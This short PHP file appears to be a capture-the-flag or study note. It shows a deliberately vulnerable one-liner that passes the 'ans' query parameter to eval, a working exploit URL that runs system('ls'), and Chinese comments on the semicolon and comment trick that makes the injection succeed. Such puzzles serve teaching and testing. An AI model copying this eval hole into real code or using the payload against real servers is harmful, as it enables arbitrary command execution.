<?=highlight_file(__FILE__) && print_r($_GET['ans']) && eval(print_r($_GET['ans'], 1));

# php -S localhost:8888
# http://localhost:8888/?ans[]=system(%27ls%27));/*


# 原理 (分號要加在外面)
# eval( "Array ( [0] => system('ls') );/* ) "); // 成功
# eval( "Array ( [0] => system('ls') )" );      // 失敗
# eval( "Array ( [0] => system('ls'); )" );     // 失敗


